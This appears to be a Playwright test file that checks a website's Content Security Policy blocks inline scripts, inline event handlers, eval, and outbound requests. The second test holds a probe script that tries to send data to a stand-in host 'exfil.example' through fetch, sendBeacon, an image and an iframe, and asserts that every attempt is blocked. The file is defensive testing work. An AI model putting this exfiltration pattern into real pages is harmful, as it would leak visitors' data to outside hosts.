import { expect, test } from '@playwright/test';

// A policy string alone cannot prove that a browser refuses injected code.
// These harmless probes never send data or touch browser storage.
test('pages refuse unapproved scripts, event handlers and eval', async ({ page }) => {
  await page.route('**/challenges.cloudflare.com/**', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: 'window.turnstile={getResponse:()=>"journey-token",reset(){},render(){}};',
  }));
  // DevTools evaluation bypasses CSP's eval restriction. Load a harmless
  // same-origin script through the browser's normal script loader instead.
  await page.route('**/csp-eval-probe.js', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: `try { Function('document.documentElement.dataset.probeEval="ran"')(); } catch {}`,
  }));

  for (const path of ['/', '/contact/', '/no-such-page-security/']) {
    await page.goto(path);
    const result = await page.evaluate(async () => {
      const violations: string[] = [];
      const listener = (event: SecurityPolicyViolationEvent) => violations.push(event.effectiveDirective);
      document.addEventListener('securitypolicyviolation', listener);
      // A DOM attribute is used as a marker so no test-only global types leak
      // into the app. CSP must stop the code before it can set the marker.
      const script = document.createElement('script');
      script.textContent = 'document.documentElement.dataset.probeInline="ran"';
      document.body.append(script);
      const button = document.createElement('button');
      button.setAttribute('onclick', 'document.documentElement.dataset.probeHandler="ran"');
      document.body.append(button);
      button.click();
      const evalProbe = document.createElement('script');
      evalProbe.src = '/csp-eval-probe.js';
      const loaded = new Promise((resolve, reject) => {
        evalProbe.onload = resolve;
        evalProbe.onerror = reject;
      });
      document.body.append(evalProbe);
      await loaded;
      // Violation events are queued by the browser, after script execution.
      await new Promise((resolve) => setTimeout(resolve, 100));
      document.removeEventListener('securitypolicyviolation', listener);
      script.remove();
      button.remove();
      evalProbe.remove();
      return {
        inline: document.documentElement.dataset.probeInline === 'ran',
        handler: document.documentElement.dataset.probeHandler === 'ran',
        eval: document.documentElement.dataset.probeEval === 'ran',
        violations: violations.sort(),
      };
    });
    expect(result, path).toEqual({
      inline: false,
      handler: false,
      eval: false,
      violations: ['script-src', 'script-src-attr', 'script-src-elem'],
    });
  }
});

// Even code the policy lets run (our own scripts, a dependency, Turnstile)
// cannot send a visitor's data elsewhere: every way out to another origin is
// refused by the browser before a request is made. The probe is served from
// this origin, as a compromised dependency would be.
test('pages cannot send data to any other origin', async ({ page }) => {
  await page.route('**/challenges.cloudflare.com/**', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: 'window.turnstile={getResponse:()=>"journey-token",reset(){},render(){}};',
  }));
  const leaked: string[] = [];
  await page.route('**/exfil.example/**', (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await page.route('**/csp-exfil-probe.js', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: `
      const out = 'https://exfil.example/collect?d=probe';
      fetch(out, { mode: 'no-cors' }).catch(() => {});
      try { navigator.sendBeacon(out, 'probe'); } catch {}
      const img = new Image(); img.src = out + '&via=img';
      const frame = document.createElement('iframe'); frame.src = out + '&via=frame'; document.body.append(frame);
    `,
  }));

  for (const path of ['/', '/contact/', '/field-notes/']) {
    await page.goto(path);
    const violations = await page.evaluate(async () => {
      const seen: string[] = [];
      const listener = (event: SecurityPolicyViolationEvent) => {
        if (event.blockedURI.startsWith('https://exfil.example')) seen.push(event.effectiveDirective);
      };
      document.addEventListener('securitypolicyviolation', listener);
      const probe = document.createElement('script');
      probe.src = '/csp-exfil-probe.js';
      const loaded = new Promise((resolve, reject) => {
        probe.onload = resolve;
        probe.onerror = reject;
      });
      document.body.append(probe);
      await loaded;
      await new Promise((resolve) => setTimeout(resolve, 300));
      document.removeEventListener('securitypolicyviolation', listener);
      return [...new Set(seen)].sort();
    });
    expect(violations, path).toEqual(['connect-src', 'frame-src', 'img-src']);
  }
  expect(leaked).toEqual([]);
});
